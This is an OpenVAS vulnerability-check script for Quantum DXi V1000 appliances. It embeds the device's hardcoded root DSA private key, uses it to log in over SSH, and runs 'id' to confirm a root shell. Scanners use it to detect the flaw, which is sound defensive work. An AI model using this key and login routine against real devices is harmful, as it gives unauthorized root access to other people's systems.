###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quantum_dxi_ssh_root_auth_bypass_vuln.nasl 6750 2017-07-18 09:56:47Z teissa $
#
# Quantum DXi Remote 'root' Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804414";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6750 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-18 11:56:47 +0200 (Tue, 18 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-03-19 11:54:59 +0530 (Wed, 19 Mar 2014)");
  script_name("Quantum DXi Remote 'root' Authentication Bypass Vulnerability");

  tag_summary = "This host is running Quantum DXi and is prone to
authentication bypass vulnerability.";

  tag_vuldetect =
"Send a SSH Private Key and check whether it is possible to login to
the target machine";

  tag_insight ="
- The root user has a hardcoded password that is unknown and not changeable.
  Normally access is only through the restricted shells.
- The /root/.ssh/authorized_keys on the appliance contains the static private
  ssh key. Using this key on a remote system to login through SSH will give
  a root shell.";

  tag_impact =
"Successful exploitation will allow attacker to  gain unauthorized root
access to affected devices and completely compromise the devices.

Impact Level: System/Application";

  tag_affected =
"Quantum DXi V1000 2.2.1 and below";

  tag_solution =
"Upgrade to Quantum DXi V1000 2.3.0.1 or later,
For updates refer to http://quantum.com";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125755");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/quantum-dxi-v1000-221-ssh-key-root-user");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Gain a shell remotely");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  exit(0);
}


include("ssh_func.inc");

## Variable Initialization
userName = "root";
loginCheck = "";
qdPort = "";
qdSoc = "";

## default port
qdPort = get_kb_item("Services/ssh");
if(!qdPort){
  qdPort = 22;
}

## check the port status
if(!get_port_state(qdPort)){
  exit(0);
}

## create the socket
if(!qdSoc = open_sock_tcp(qdPort)){
  exit(0);
}

priv ='-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEgBNwgF+IbMU8NHUXNIMfJ0ONa91ZI/TphuixnilkZqcuwur2
hMbrqY8Yne+n3eGkuepQlBBKEZSd8xPd6qCvWnCOhBqhkBS7g2dH6jMkUl/opX/t
Rw6P00crq2oIMafR4/SzKWVW6RQEzJtPnfV7O3i5miY7jLKMDZTn/DRXRwIVALB2
+o4CRHpCG6IBqlD/2JW5HRQBAoGAaSzKOHYUnlpAoX7+ufViz37cUa1/x0fGDA/4
6mt0eD7FTNoOnUNdfdZx7oLXVe7mjHjqjif0EVnmDPlGME9GYMdi6r4FUozQ33Y5
PmUWPMd0phMRYutpihaExkjgl33AH7mp42qBfrHqZ2oi1HfkqCUoRmB6KkdkFosr
E0apJ5cCgYBLEgYmr9XCSqjENFDVQPFELYKT7Zs9J87PjPS1AP0qF1OoRGZ5mefK
6X/6VivPAUWmmmev/BuAs8M1HtfGeGGzMzDIiU/WZQ3bScLB1Ykrcjk7TOFD6xrn
k/inYAp5l29hjidoAONcXoHmUAMYOKqn63Q2AsDpExVcmfj99/BlpQIUYS6Hs70u
B3Upsx556K/iZPPnJZE=
-----END DSA PRIVATE KEY-----';

## try to login
loginCheck = ssh_login (socket:qdSoc, login:userName, password:NULL, pub:NULL, priv:priv, passphrase:NULL );
if(loginCheck == 0 )
{
  cmd = ssh_cmd(socket:qdSoc, cmd:"id" );

  ## confirm the code execution
  if(ereg(pattern:"uid=[0-9]+.*gid=[0-9]+", string:cmd))
  {
    security_message(port:qdPort);
    close(qdSoc);
    exit(0);
  }
}

close(qdSoc);
